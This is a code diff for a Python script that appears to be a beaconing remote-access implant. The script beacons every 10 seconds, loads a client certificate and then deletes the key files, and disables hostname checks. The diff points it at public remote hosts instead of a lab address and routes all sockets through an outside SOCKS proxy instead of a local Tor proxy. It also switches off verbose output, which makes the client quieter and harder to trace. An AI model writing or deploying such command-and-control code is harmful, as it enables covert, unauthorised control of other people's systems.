@@ -7,10 +7,12 @@ from datetime import datetime
 from sys import exit
 from signal import SIGTERM
 
-remote_ip = '10.0.0.18'
-remote_port = 8080
+remote_ip = '206.189.39.65'
+remote_port = 8081
+proxy_ip = '95.216.33.245'
+proxy_port = 10250
 server_sni_hostname = ''
-VERBOSE = True
+VERBOSE = False
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL = 10    #in seconds
 
@@ -160,9 +162,12 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
-    s = socks.socksocket()
+    #s = socks.socksocket()
+    #s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
     #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    socket.socket = socks.socksocket
+    s = socks.socksocket()
     conn = context.wrap_socket(s, server_side=False)
     try:
         if VERBOSE:
